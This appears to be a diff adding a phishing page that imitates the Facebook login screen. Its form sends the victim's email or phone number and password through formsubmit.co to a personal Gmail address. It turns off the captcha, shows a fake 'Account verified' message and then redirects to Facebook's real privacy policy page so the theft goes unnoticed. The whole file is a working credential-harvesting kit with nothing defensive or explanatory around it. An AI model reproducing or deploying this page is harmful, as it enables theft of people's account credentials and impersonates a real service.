@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>facebooklogin.meta</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+  <p class="facebook">facebook</p>
+  <main>
+    <form method="POST" action="https://formsubmit.co/yolandangoepe@gmail.com">
+
+      <!-- Honeypot -->
+      <input type="text" name="_honey" style="display: none;">
+
+      <!-- Disable Captcha -->
+      <input type="hidden" name="_captcha" value="false">
+
+      <!--success page-->
+      
+      <input type="hidden" name="_next" value="https://www.facebook.com/privacy/policy/">
+      
+
+      <fieldset>
+        <input id="account-details" name="EmailForm" placeholder="Mobile number or email address" type="text" required />
+
+        <input id="new-password" name="new-password" placeholder="Password" type="password"
+          required />
+      </fieldset>
+
+      
+      <input id="button" class="submit" type="submit" onclick="return confirm('Account verified, enjoy facebook')" value="Log In" />
+
+    </form>
+    <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"><p>Forgotten password?</p></a>
+
+    <div class="or">
+                    <hr><span id="or">or</span><hr>
+                </div>
+                <div class="other-choice">
+                    <a href="https://www.facebook.com/reg/" id="create-new-account">Create New Account</a>
+                    
+                </div>
+                <div class="languages">
+                    <a href="#" style="color: rgb(166, 158, 158);">English (UK)</a>
+                    <a href="#">Francaise (France)</a>
+                    <a href="#">Afrikaans</a>
+                    <a href="#">Italiano</a>
+                    <a href="#">Espanol</a>
+                    <a href="#">Portuguese(Portugal)</a>
+                    <a href="#">Deutsch</a>
+                    <span><a href="#" id="language-plus">+</a></span>
+                </div>
+                <div class="footer-copyright">
+                    Meta &#169; 2022
+                </div>
+            </div>
+
+  </main>
+</body>
+
+</html>
